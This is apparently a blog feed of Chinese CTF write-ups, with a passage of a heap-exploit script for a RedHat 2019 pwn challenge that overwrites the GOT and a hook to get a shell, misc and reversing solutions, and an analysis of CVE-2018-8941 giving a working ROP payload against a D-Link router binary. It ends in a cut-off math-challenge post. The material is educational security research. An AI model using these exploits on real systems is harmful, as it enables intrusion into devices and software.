class="string">'\xa1'</span>)</span><br><span class="line"></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">构造第三个double free，chunk大小为0x70</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">5</span>):</span><br><span class="line">add(<span class="number">0x40</span>, <span class="string">'xxx'</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">2</span>):</span><br><span class="line">add(<span class="number">0x60</span>, <span class="string">'xxx'</span>)</span><br><span class="line"></span><br><span class="line">remove(<span class="number">13</span>)</span><br><span class="line">remove(<span class="number">13</span>)</span><br><span class="line">remove(<span class="number">19</span>)</span><br><span class="line">remove(<span class="number">16</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">3</span>):</span><br><span class="line">remove(<span class="number">13</span>)</span><br><span class="line">remove(<span class="number">13</span>)</span><br><span class="line"></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">释放chunkA，获得libc指针</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line">remove(<span class="number">1</span>)</span><br><span class="line">remove(<span class="number">0</span>) <span class="comment"># 这个只是为了腾空间</span></span><br><span class="line"></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">使用第一个double free，用于在got表处分配一个chunk，将free_got修改为puts_plt</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line">puts_plt = <span class="number">0x4006a0</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x50</span>, p64(<span class="number">0x601ffa</span>))</span><br><span class="line">add(<span class="number">0x50</span>, <span class="string">'xxx'</span>)</span><br><span class="line">add(<span class="number">0x50</span>, <span class="string">'xxx'</span>)</span><br><span class="line">add(<span class="number">0x50</span>, <span class="string">'\x00'</span>*<span class="number">0xe</span> + p64(puts_plt)[:<span class="number">6</span>])</span><br><span class="line"></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">输出chunkA处的libc指针</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line">remove(<span class="number">6</span>) <span class="comment"># free已经被替换为了puts</span></span><br><span class="line">libc_base = u64(p.recvline()[:<span class="number">-1</span>].ljust(<span class="number">8</span>, <span class="string">'\x00'</span>)) - <span class="number">0x3c4b78</span></span><br><span class="line">realloc_hook = libc_base + <span class="number">0x3c4aed</span></span><br><span class="line">one_gadget = libc_base + <span class="number">0x4526a</span></span><br><span class="line">realloc = libc_base + libc.symbols[<span class="string">'__libc_realloc'</span>]</span><br><span class="line">success(<span class="string">'libc_base: %#x'</span> % libc_base)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x60</span>, p64(realloc_hook))</span><br><span class="line">add(<span class="number">0x60</span>, <span class="string">'xxxx'</span>)</span><br><span class="line">add(<span class="number">0x60</span>, <span class="string">'xxxx'</span>)</span><br><span class="line">add(<span class="number">0x60</span>, <span class="string">'\x00'</span>*<span class="number">0xb</span> + p64(one_gadget) + p64(realloc+<span class="number">12</span>)) <span class="comment">#使用realloc调整栈空间</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 最后手工再调用一下add()就能getshell了</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line"><span class="keyword">while</span>(<span class="literal">True</span>):</span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">main()</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">p.interactive()</span><br><span class="line">p.close()</span><br><span class="line"><span class="keyword">break</span></span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line">p.close()</span><br><span class="line">p = process(<span class="string">'./NameSystem'</span>)</span><br></pre></td></tr></table></figure><h2 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h2><h3 id="签到"><a href="#签到" class="headerlink" title="签到"></a>签到</h3><p>回答问卷 </p><h3 id="恶臭的数据包"><a href="#恶臭的数据包" class="headerlink" title="恶臭的数据包"></a>恶臭的数据包</h3><p>Wireshark打开数据包，全是802.11协议，需要解密，用aircrack-ng进行爆破，密码为12345678 </p><p><img src="https://i.loli.net/2019/11/10/cgnuNa2dsZG4qE9.png" alt="2.png"></p><p>对数据包解密 </p><p><img src="https://i.loli.net/2019/11/10/DiajQZGhdHPgykf.png" alt="3.png"></p><p>重新wireshark打开，发现可导出一张图片 </p><p><img src="https://i.loli.net/2019/11/10/gUfFVJwhR3y7TmP.png" alt="_M_L_8_V4_@U_UX_QJ6L8O6.png"></p><p>Binwalk检查图片发现藏有压缩包，压缩包内为flag，但是没有密码，又回到数据包上，查看http流，在携带该图片的数据包里用base64解密session值可以看到hint，这里需要将session以句点分段解密，还要补全末尾的==。 </p><p><img src="https://i.loli.net/2019/11/10/i2cX6hGIYRgqVQ5.png" alt="4.png"></p><p><img src="https://i.loli.net/2019/11/10/LkIEyD91qgQJoBH.png" alt="_8XW3_AKYB_CHP@MID__@WQ.png"></p><p>Hint说密码为ping过的网址，在数据包中没有找到icmp包，但是有dns解析网址的包，逐个尝试网址成功解密压缩包。 </p><h3 id="Advertising-for-Marriage"><a href="#Advertising-for-Marriage" class="headerlink" title="Advertising for Marriage"></a>Advertising for Marriage</h3><p>首先用volatility查看进程，发现notepad.exe： </p><p><img src="https://i.loli.net/2019/11/11/VeX419ZjnvmpN2s.png" alt="5.png"></p><p>使用notepad插件提取出hint： </p><p><img src="https://i.loli.net/2019/11/11/wf79Ilyjn6ribRp.png" alt="6.png"></p><p>hint:????needmoneyandgirlfirend</p><p>同时，进程中存在mspaint.exe:</p><p><img src="https://i.loli.net/2019/11/11/VeX419ZjnvmpN2s.png" alt="5.png"></p><p>提取出来，修改后缀为data，使用gimp读取。调整宽度可以发现四个字符，此时对应前面的hint的四个问号，正好组成一个完整的字符串： </p><p><img src="https://i.loli.net/2019/11/11/HPSrj8Ck7ML3sUz.png" alt="8.png"></p><p>组成完整的字符串：b1cxneedmoneyandgirlfirend（原图有些看不清，本来以为是PJCX，经过后面猜测发现是b1cx）</p><p>这时，再查找映像中的文件，发现存在png文件：</p><p><img src="https://i.loli.net/2019/11/11/2KL4YJ7HUuGcvem.png" alt="9.png"></p><p>提取出来： </p><p><img src="https://i.loli.net/2019/11/11/WRUqnbdF4OtVjxv.png" alt="10.png"></p><p>尝试打开，发现CRC不对：</p><p><img src="https://i.loli.net/2019/11/11/YJBqeGDjdPkwgbN.png" alt="11.png"></p><p>Winhex打开图片： </p><p><img src="https://i.loli.net/2019/11/11/X7wdBCtp6O4qgJl.png" alt="12.png"></p><p>使用脚本爆破CRC对应的高度： </p><p><img src="https://i.loli.net/2019/11/11/GcfqrFduS2aiyzm.png" alt="13.png"></p><p>高度：</p><p><img src="https://i.loli.net/2019/11/11/nPlrZibNmfeTzxw.png" alt="14.png"></p><p>修改： </p><p><img src="https://i.loli.net/2019/11/11/t8yIRv9or7FExLs.png" alt="15.png"></p><p>发现模糊的flag：</p><p><img src="https://i.loli.net/2019/11/11/8sChyWeJ4Oab6pF.png" alt="1573433598290.png"></p><p>由于前面有字符串，又不是flag，猜测使用该字符串作为密码进行lsb提取： </p><p><img src="https://i.loli.net/2019/11/11/CYpB4VWE1x7is2c.png" alt="1573433658859.png"></p><p>提取出一个base64码:</p><p>​                              <img src="https://i.loli.net/2019/11/11/FyovSNexJGXAbuq.png" alt="1573433713373.png"></p><p>维吉尼亚：</p><p><img src="https://i.loli.net/2019/11/11/W9Omr8L2V15giPy.png" alt="1573433782805.png"></p><p>对比发现，前面的密码和此处的密文长度一致，猜测维吉尼亚的密钥也为第一个密码：</p><p>b1cxneedmoneyandgirlfirend</p><p>gnxtmwg7r1417psedbs62587h0</p><p>解密，得到flag：</p><p><img src="https://i.loli.net/2019/11/11/Dtuk8CFsVyXUBqw.png" alt="1573434014916.png"></p><p>对比之前的图片，可以确定flag是正确的： </p><p><img src="https://i.loli.net/2019/11/11/8sChyWeJ4Oab6pF.png" alt="1573433598290.png"></p><h2 id="Reverse"><a href="#Reverse" class="headerlink" title="Reverse"></a>Reverse</h2><h3 id="xx"><a href="#xx" class="headerlink" title="xx"></a>xx</h3><p>输入限制：输入长度为19，且输入只能为以下字符串范围内的字符</p><p>qwertyuiopasdfghjklzxcvbnm1234567890</p><img src="/2019/11/10/2019redhat/16.png"><img src="/2019/11/10/2019redhat/17.png"><p>会将输入的前四个字节取出作为key，进行xxtea加密。</p><p>根据算法里移位和0x61C88647，可以判断出该算法为xxtea算法。</p><img src="/2019/11/10/2019redhat/18.png"><p>xxtea密文经过下列简单的置换 </p><img src="/2019/11/10/2019redhat/19.png"><p>再进行简单的异或处理，生成最终密文 </p><img src="/2019/11/10/2019redhat/20.png"><p>最终密文应该为</p><p>0xce,0xBC,0x40,0x6b,0x7c,0x3a,0x95,0xc0,0xef,0x9b,0x20,0x20,0x91,0xf7,0x2,0x35,0x23,0x18,0x2,0xc8,0xe7,0x56,0x56,0xfa</p><p>使用异或处理脚本得到异或前的密文</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0x17</span>,<span class="number">1</span>,<span class="number">-1</span>):</span><br><span class="line">   cur=<span class="number">0x17</span>-i</span><br><span class="line">   v22=i/<span class="number">3</span><span class="number">-1</span></span><br><span class="line">   <span class="keyword">if</span> i&gt;=<span class="number">3</span>:</span><br><span class="line">      <span class="keyword">while</span>(v22!=<span class="number">-1</span>):</span><br><span class="line">         tmp=v21[i]</span><br><span class="line">         v21[i]=tmp^v21[v22]</span><br><span class="line">         v22=v22<span class="number">-1</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> v21:</span><br><span class="line">   <span class="keyword">print</span> hex(i)</span><br></pre></td></tr></table></figure><p>异或前的密文为</p><p>0xce,0xbc,0x40,0xa5,0xb2,0xf4,0xe7,0xb2,0x9d,0xa9,0x12,0x12,0xc8,0xae,0x5b,0x10,0x6,0x3d,0x1d,d7,0xf8,0xdc,0xdc,0x70</p><p>推出置换前的密文为</p><p>bc  a5  ce  40  f4 b2  b2  e7 a9 12 9d  12 ae 10  c8 5b 3d d7 6 1d dc 70  f8   dc</p><p>使用xxtea解密函数，因为已知输入前四字节为flag，所以密钥为flag。</p><p>解密出flag为flag{CXX_and_++tea}</p><h3 id="easyRE"><a href="#easyRE" class="headerlink" title="easyRE"></a>easyRE</h3><p>第一个输入对相应密文做简单的异或处理便可得到。 </p><img src="/2019/11/10/2019redhat/21.png"><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">a=[<span class="number">0x49</span>,<span class="number">0x6F</span>,<span class="number">0x64</span>,<span class="number">0x6C</span>,<span class="number">0x3E</span>,<span class="number">0x51</span>,<span class="number">0x6E</span>,<span class="number">0x62</span>,<span class="number">0x28</span>,<span class="number">0x6F</span>,<span class="number">0x63</span>,<span class="number">0x79</span>,<span class="number">0x7F</span>,<span class="number">0x79</span>,<span class="number">0x2E</span>,<span class="number">0x69</span>,<span class="number">0x7F</span>,<span class="number">0x64</span>,<span class="number">0x60</span>,<span class="number">0x33</span>,<span class="number">0x77</span>,<span class="number">0x7D</span>,<span class="number">0x77</span>,<span class="number">0x65</span>,<span class="number">0x6B</span>,<span class="number">0x39</span>,<span class="number">0x7B</span>,<span class="number">0x69</span>,<span class="number">0x79</span>,<span class="number">0x3D</span>,<span class="number">0x7E</span>,<span class="number">0x79</span>,<span class="number">0x4C</span>,<span class="number">0x40</span>,<span class="number">0x45</span>,<span class="number">0x43</span>]</span><br><span class="line">input1=<span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">36</span>):</span><br><span class="line">   input1+=chr(a[i]^i)</span><br><span class="line"><span class="keyword">print</span> input1</span><br></pre></td></tr></table></figure><p>得到第一个输入为Info:The first four chars are <code>flag</code></p><p>第二个输入会经过N层base64编码，最终和密文进行比较，所以只需要把密文base64不断解码即可得到第二个输入为</p><p><a href="https://bbs.pediy.com/thread-254172.htm" target="_blank" rel="noopener">https://bbs.pediy.com/thread-254172.htm</a></p><p>点击进入该网页是关于主动防御的内容，经过仔细查看网页里并没有flag。</p><p>第二个输入检查完毕后程序就退出了，我用strace跟过也没发现其他的系统调用。</p><p>这时想起今年国赛的一个Pwn，用到了析构函数，所去查看析构函数，果然有发现。</p><img src="/2019/11/10/2019redhat/22.png"><p>进入400D35函数，可以看到v2为时间差的计算后进行一系列操作，最后字符有和’f’,’g’字符的比较，由于循环中的处理是对4取余，所以我们只用使 前v2前四个字节和6CC0A0进行异或后为flag即可。最后程序会输出flag。 </p><img src="/2019/11/10/2019redhat/23.png"><img src="/2019/11/10/2019redhat/24.png"><h3 id="childRE"><a href="#childRE" class="headerlink" title="childRE"></a>childRE</h3><p>首先要求输入长度为31. </p><img src="/2019/11/10/2019redhat/25.png"><p>我们的输入会生成二叉树，并且后序遍历会写入name数组 </p><img src="/2019/11/10/2019redhat/26.png"><p>接下来对name数组进行反修饰，要求反修饰得到62字节outputString后开始校验 </p><img src="/2019/11/10/2019redhat/27.png"><p>该校验其实就是个表的行列对比，求outputString的脚本如下 </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">table11=<span class="string">'(_@4620!08!6_0*0442!@186%%0@3=66!!974*3234=&amp;0^3&amp;1@=&amp;0908!6_0*&amp;'</span></span><br><span class="line">table12=<span class="string">'55565653255552225565565555243466334653663544426565555525555222'</span></span><br><span class="line">table2=<span class="string">'1234567890-=!@#$%^&amp;*()_+qwertyuiop[]QWERTYUIOP&#123;&#125;asdfghjkl;'</span>+chr(<span class="number">0x27</span>)+<span class="string">'ASDFGHJKL:"ZXCVBNM&lt;&gt;?zxcvbnm,./'</span></span><br><span class="line">flag=<span class="string">''</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0x3e</span>):</span><br><span class="line">   tmp1=table11[i]</span><br><span class="line">   tmp2=table12[i]</span><br><span class="line">   <span class="keyword">for</span> k <span class="keyword">in</span> range(<span class="number">20</span>,<span class="number">128</span>):</span><br><span class="line">      <span class="keyword">if</span>(table2[(k%<span class="number">23</span>)] == tmp1 <span class="keyword">and</span> table2[(k/<span class="number">23</span>)] == tmp2):</span><br><span class="line">         flag+=chr(k)</span><br><span class="line">         <span class="keyword">break</span></span><br><span class="line"><span class="keyword">print</span> flag</span><br></pre></td></tr></table></figure><p>得到outputStirng应该为：</p><p>private: char <em> __thiscall R0Pxx::My_Aut0_PWN(unsigned char </em>)</p><p>那么我们现在需要对该函数进行修饰，可以参考c++类成员函数的修饰规则</p><p><a href="https://blog.csdn.net/wenqiang1208/article/details/53163788" target="_blank" rel="noopener">https://blog.csdn.net/wenqiang1208/article/details/53163788</a></p><p>我们选择直接用VS提供的宏，得到修饰后的函数名如下：</p><img src="/2019/11/10/2019redhat/28.png"><p>修饰后的函数名为?My_Aut0_PWN@R0Pxx@@AAEPADPAE@Z</p><p>然后排一下二叉树即可得到我们的输入为</p><p>Z0@tRAEyuP@xAAA?M_A0_WNPx@@EPDP</p><p>其MD5值为63b148e750fed3a33419168ac58083f5，所以flag为</p><p>flag{ 63b148e750fed3a33419168ac58083f5}</p><h3 id="hxb-re1"><a href="#hxb-re1" class="headerlink" title="hxb_re1"></a>hxb_re1</h3><p>加了壳，懒得脱壳直接调试跟进去看。。。</p><p>首先需要输入长度19的字符串和一个命令函参数</p><p>然后命令行参数会做简单的变换最后和fmcj2y~{字符串进行对比，不用管对比，直接在内存里修改为fmcj2y~{就可以了。</p><img src="/2019/11/10/2019redhat/33.png"><p>接下来程序会使用fopen和fread读取名为fmcj2y~{文件里的32个字符</p><img src="/2019/11/10/2019redhat/34.png"><p>32个字符转换为16进制(比如输入4f，在内存中16进制便是4f)后最后输入进入4013B6进行验证，要求字符转的16进制+1后与下列数据相等。所以将红框里的数据逐个减一便是我们的flag</p><p>也就是说fmcj2y~{文件里的内容应该是4fc5f0e3e2e199a0a6ddd945aa2dfeda</p><img src="/2019/11/10/2019redhat/35.png"><p>得到flag如下</p><img src="/2019/11/10/2019redhat/36.png"><h3 id="hxb-re2"><a href="#hxb-re2" class="headerlink" title="hxb_re2"></a>hxb_re2</h3><p>我们的输入应该是26个整数，且只能为1，2，3，4。1，2，3，4分别是不同的变量进行运算。</p><img src="/2019/11/10/2019redhat/29.png"><img src="/2019/11/10/2019redhat/30.png"><p>通过的条件如下。</p><img src="/2019/11/10/2019redhat/31.png"><p>我们看到asc_140003350数组如下：(因为变量会涉及到*7，所以按7个一行排列)</p><p>0x00000008, 0x00000001, 0x0000000E, 0x0000000B, 0x00000007, 0x00000010, 0x00000001</p><p>0x0000000B, 0x0000000F, 0x0000000F, 0x00000001, 0x00000001, 0x00000009, 0x00000001</p><p>0x00000001, 0x00000001, 0x00000001, 0x00000001, 0x00000001, 0x0000000B, 0x00000001</p><p>0x0000000C, 0x0000000C, 0x00000008, 0x0000000E, 0x00000001, 0x00000008, 0x00000001</p><p>0x00000008, 0x00000001, 0x00000001, 0x0000000C, 0x00000009, 0x0000000E, 0x00000001</p><p>0x0000000D, 0x00000008, 0x0000000B, 0x00000001, 0x00000001,0x00000001, 0x00000001</p><p>0x00000001, 0x00000001, 0x00000009, 0x0000000A, 0x00000009, 0x00000009, 0x00000063,</p><p>发现是个迷宫，所以输入1代表上，2代表下，3代表左，4代表右。只要从左上角走到右下角便能拿到flag了</p><p>所以输入相应的上下左右便能走出迷宫</p><img src="/2019/11/10/2019redhat/32.png">]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;[TOC]&lt;/p&gt;
&lt;h2 id=&quot;PWN&quot;&gt;&lt;a href=&quot;#PWN&quot; class=&quot;headerlink&quot; title=&quot;PWN&quot;&gt;&lt;/a&gt;PWN&lt;/h2&gt;&lt;h3 id=&quot;three&quot;&gt;&lt;a href=&quot;#three&quot; class=&quot;headerlink&quot; title</summary>
      
    
    
    
    <category term="ctf wp" scheme="http://pidanxu.github.io/categories/ctf-wp/"/>
    
    
    <category term="ctf" scheme="http://pidanxu.github.io/tags/ctf/"/>
    
  </entry>
  
  <entry>
    <title>CVE-2018-8941分析</title>
    <link href="http://pidanxu.github.io/2019/10/31/CVE-2018-8941%E5%88%86%E6%9E%90/"/>
    <id>http://pidanxu.github.io/2019/10/31/CVE-2018-8941%E5%88%86%E6%9E%90/</id>
    <published>2019-10-31T08:01:37.000Z</published>
    <updated>2019-10-31T09:16:32.118Z</updated>
    
    <content type="html"><![CDATA[<p>[TOC]</p><p>文章首发于先知社区 :<a href="https://xz.aliyun.com/t/6607" target="_blank" rel="noopener">https://xz.aliyun.com/t/6607</a></p><h2 id="cve-2018-8941分析"><a href="#cve-2018-8941分析" class="headerlink" title="cve-2018-8941分析"></a>cve-2018-8941分析</h2><p>想开始入门搞搞路由器，选择cve-2018-8941入门。因为感觉网上能找到的资料不是太详细，所以想写一篇新手入门向的记录一下。</p><p>漏洞信息:<a href="https://github.com/SECFORCE/CVE-2018-8941" target="_blank" rel="noopener">https://github.com/SECFORCE/CVE-2018-8941</a></p><p>参考:<a href="https://www.freebuf.com/articles/wireless/168870.html" target="_blank" rel="noopener">https://www.freebuf.com/articles/wireless/168870.html</a></p><p>固件下载: <a href="ftp://ftp.dlink.eu/Products/dsl/dsl-3782/driver_software/DSL-3782_A1_EU_1.01_07282016.zip" target="_blank" rel="noopener">ftp://ftp.dlink.eu/Products/dsl/dsl-3782/driver_software/DSL-3782_A1_EU_1.01_07282016.zip</a> </p><h2 id="漏洞信息"><a href="#漏洞信息" class="headerlink" title="漏洞信息"></a>漏洞信息</h2><p>在/userfs/bin/tcapi 二进制文件中存在栈溢出漏洞，tcapi是一个被用作Web GUI中”诊断”功能的包装。</p><p>现实世界中触发该漏洞需要通过身份验证，经过身份验证的用户可以使用”set Diagnostics_Entry”功能将一个长缓冲区作为”Addr”参数传递给” /user / bin / tcapi”二进制文件，并导致内存损坏。进一步可以覆盖返回地址，劫持控制流执行任意代码。</p><h2 id="详细分析"><a href="#详细分析" class="headerlink" title="详细分析"></a>详细分析</h2><p>首先用firmware-analysis-toolkit进行一个仿真模拟，在里面发现了Diagnostics Entry Address的接口</p><img src="/2019/10/31/CVE-2018-8941分析/1.png"><p>但是无法输入造成栈溢出的数据(因为在前端有校验)，所以通过burpsuite发送造成栈溢出的数据。</p><img src="/2019/10/31/CVE-2018-8941分析/2.png"><p>把burpsuite发送的内容改成栈溢出的数据，可以看到存返回地址的ra寄存器已经被覆盖了</p><img src="/2019/10/31/CVE-2018-8941分析/3.png"><p>路由器也崩了</p><img src="/2019/10/31/CVE-2018-8941分析/4.png"><p>现在回到具体漏洞点，首先运行tcapi文件，用qemu-mips-static来运行程序以及进行调试。</p><img src="/2019/10/31/CVE-2018-8941分析/5.png"><p>我们要运行的是set 功能 后面应该跟三个参数，正常来说应该是这样的：sudo chroot . ./qemu-mips-static userfs/bin/tcapi set Diagn<br>ostics_Entry Addr www 或者IP (如192.168.100.1）</p><p>我们使用IDA进行调试来看一下，给qemu提供了调试功能，-g 参数加上端口号就可以用gdb或者IDA的remote gdb 进行调试了。</p><img src="/2019/10/31/CVE-2018-8941分析/6.png"><p>可以看到程序调用tcapi_set函数，该函数位于libtcapi中实现。</p><img src="/2019/10/31/CVE-2018-8941分析/7.png"><p>而tcapi_set中的strcpy调用没有检验长度导致了栈溢出的发生。且简单计算可以得知存放返回地址的栈距离第三个参数在栈上的偏移是596</p><img src="/2019/10/31/CVE-2018-8941分析/8.png"><p>我们令第三个参数为’A’*596+’BBBB’，实际调试的时候可以看到，当栈溢出发生后，存放返回值的寄存器的值变为了42424242(‘BBBB’)</p><img src="/2019/10/31/CVE-2018-8941分析/9.png"><p>已经可以覆盖返回地址了，那么接下来怎么执行我们自己的命令呢？checksec可以看到什么保护都没开，那首先考虑写shellcode?本来我的想法是找到类似jmp esp这样的指令然后在后面写Shellcode就行了。这个打算后面花时间看看mips有没有类似的指令，或者看看有没有哪里可以泄露栈地址？</p><img src="/2019/10/31/CVE-2018-8941分析/10.png"><p>老老实实构造rop链，然而发现tcapi这个程序里没有合适的gadget,只能去libc里找了，可以通过readelf -d 判断程序的依赖库</p><img src="/2019/10/31/CVE-2018-8941分析/11.png"><p>我们选择libc.so.0</p><p>首先我们可以控制的是s0-s3,ra，使用mipsrop查找符合条件的gadget</p><img src="/2019/10/31/CVE-2018-8941分析/12.png"><p>我们选择16710偏移处的gadget，最终调用的函数地址由s0寄存器决定，而参数是sp+24，所以我们只需要让libcbase+16708覆盖$ra寄存器，system实际地址覆盖s0寄存器，和esp+24。</p><p>那么为了测试，我们需要获得libc基址，原Poc作者说”since we are exploiting through the WEB GUI, binary process mappings (/proc/pid of boa/maps) were obtained from ‘/userfs/bin/boa’ binary”，意思是运行boa，然后通过cat proc/pid/boa 获得libc基址吗?但是经过我的测试发现并不能对应上，我拿到基址的方法是通过给qemu 加上-strace参数，然后看系统调用得到的。</p><img src="/2019/10/31/CVE-2018-8941分析/13.png"><p>这里我也不太确定，我看到open libc.so.0过后用read读进了0x40867000，把0x40867000+offset带进IDA里去找，稍微调整一下发现了0x40868000是libc基址。</p><p>所以最后我们的payload就是</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">import struct</span><br><span class="line">libc_base = 0x40868000</span><br><span class="line">libc_system = struct.pack(<span class="string">"&gt;I"</span>,libc_base+0x59bb0) </span><br><span class="line">rop_pad = <span class="string">'A'</span>*580</span><br><span class="line">s0 = libc_system</span><br><span class="line">s1 = <span class="string">'BBBB'</span></span><br><span class="line">s2 = <span class="string">'BBBB'</span></span><br><span class="line">s3 = <span class="string">'BBBB'</span></span><br><span class="line">ra = struct.pack(<span class="string">"&gt;I"</span>,libc_base+0x16708)</span><br><span class="line">payload = rop_pad + s0 + s1 + s2 + s3 + ra + <span class="string">"C"</span>*24+<span class="string">'ls'</span></span><br></pre></td></tr></table></figure><p>最后使用qemu触发就行了</p><img src="/2019/10/31/CVE-2018-8941分析/14.png">]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;[TOC]&lt;/p&gt;
&lt;p&gt;文章首发于先知社区 :&lt;a href=&quot;https://xz.aliyun.com/t/6607&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;https://xz.aliyun.com/t/6607&lt;/a&gt;&lt;/p&gt;
&lt;h2 id</summary>
      
    
    
    
    <category term="cve" scheme="http://pidanxu.github.io/categories/cve/"/>
    
    
    <category term="cve-2018-8941" scheme="http://pidanxu.github.io/tags/cve-2018-8941/"/>
    
  </entry>
  
  <entry>
    <title>roarctf2019-math</title>
    <link href="http://pidanxu.github.io/2019/10/23/roarctf2019-math/"/>
    <id>http://pidanxu.github.io/2019/10/23/roarctf2019-math/</id>
    <published>2019-10-23T07:57:07.000Z</published>
    <updated>2021-07-15T08:07:15.317Z</updated>
    
    <content type="html"><![CDATA[<h3 id="题目介绍"><a href="#题目介绍" class="headerlink" title="题目介绍"></a>题目介绍</h3><p>RoarCTF的逆向math是一个几何数学题，看出题人写的出题思路是弦心距极坐标blablabla…</p><p>题目:<a href="https://github.com/berTrAM888/RoarCTF-Writeup-some-Source-Code/tree/master/Reverse/math" target="_blank" rel="noopener">https://github.com/berTrAM888/RoarCTF-Writeup-some-Source-Code/tree/master/Reverse/math</a> </p><p>出题人给出的题目设计思路如下:</p><p>基于圆的几何问题</p><p>所有其他点的坐标都是相对A点的，可以看作坐标系移动了(Ax,Ay)</p><p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20191023185127-1041d2a4-f583-1.png" alt="10.png"></p><p>M，O点坐标已给</p><p>输入N点，MN形成弦，计算出弦心距，画一个小圆</p><p>然后进入概率check，cnt1和cnt2分别是落在小圆和大圆内的次数</p><p>符合概率 反推即 对弦心距的长度有要求</p><p>再反推N点相对A点的坐标，N有2解</p><p>最后的限制是N在圆上，正好是切点的位置</p><p>改：输入的值都进行了极坐标运算，另外添加了ollvm</p><p>通过check即给出服务器上的flag</p><p>理解几何逻辑后，根据弦心距反推N点即可</p><p>1.41421356 5.2057298 0.67083</p><p>输入上面这一串以后很大概率成功</p><p>最简单的输入A点(1,1)</p><p>于是N点坐标即为</p><p>//std::cin &gt;&gt; N.x; //N.x = A.x(1) + sqrt(5 + 2 * sqrt(5)); x == 4.07768 //std::cin &gt;&gt; N.y; //N.y = A.y(1) + sqrt(5); y == 3.23607 //转换为极坐标 tan == y/x == 3.23607 / 4.07768 == 0.793606 弧度==0.67083 // ρ == sqrt(27.0996232273) == 5.2057298 长度==5.2057298</p><p>//4.07768 3.23607 转换为极坐标后输入有较大可能性通过概率检测</p><p>但是其实说到底也就是两个方程，所以可以用matlab这种神器直接解方程，不用去做几何数学(就我的使用体验，对于浮点数的方程来说，matlab的效果比z3好太多了)。</p><h3 id="题目逻辑"><a href="#题目逻辑" class="headerlink" title="题目逻辑"></a>题目逻辑</h3><p>第一个输入是根号2不多说了，伪代码都可以看得很清楚</p><img src="/2019/10/23/roarctf2019-math/1.png"><p>我们设第二个输入是a,第三个输入是b</p><p>根据程序后面所使用的，我们令</p><p>y=a×cos(b)</p><p>z=a×sin(b)</p><p>v8=sqrt(10+2×sqrt(5))+sqrt(2)×cos(pi/4)</p><p>比较重要的函数是下面这个401049函数。两个不等式都围绕他来展开。</p><p>(下图中v29就是y,v30就是z，v27=v28=v8,v26=sqrt(2)*sin(pi/4)=1)</p><img src="/2019/10/23/roarctf2019-math/2.png"><p>该函数的第一个子函数最好跟汇编，该函数的第一个子函数的返回结果是两个乘积相减</p><img src="/2019/10/23/roarctf2019-math/3.png"><p>第二个子函数伪代码没什么问题</p><img src="/2019/10/23/roarctf2019-math/4.png"><img src="/2019/10/23/roarctf2019-math/5.png"><p>耐心跟一下可以得到第一次调用401049函数的返回值为:</p><img src="/2019/10/23/roarctf2019-math/6.png"><p>然后该返回值会进入与随机数的比较循环。</p><img src="/2019/10/23/roarctf2019-math/7.png"><p>这里可以看成是用随机数落在两个圆里的概率比来代表两个圆的面积比。所以可以通过概率比来确定返回值的大小。也就是</p><img src="/2019/10/23/roarctf2019-math/8.png"><p>该等式就是我们能获得的第一个等式。</p><p>第二个等式也和401049函数有关,v22已知，为sqrt(5)-1</p><img src="/2019/10/23/roarctf2019-math/9.png"><p>第二次的返回值是</p><img src="/2019/10/23/roarctf2019-math/10.png"><p>所以应该满足的公式为</p><img src="/2019/10/23/roarctf2019-math/11.png"><h3 id="解方程"><a href="#解方程" class="headerlink" title="解方程"></a>解方程</h3><p>   //matlab<br>    syms y z<br>    v28=vpa(sqrt(10+2 * sqrt(5))+1,24)<br>    e1=(y-v28)^2-0.0954915* ((z-1)^2+(y-v28)^2)<br>    e2=((y-1)* (sqrt(5)-1)-((z-1) * 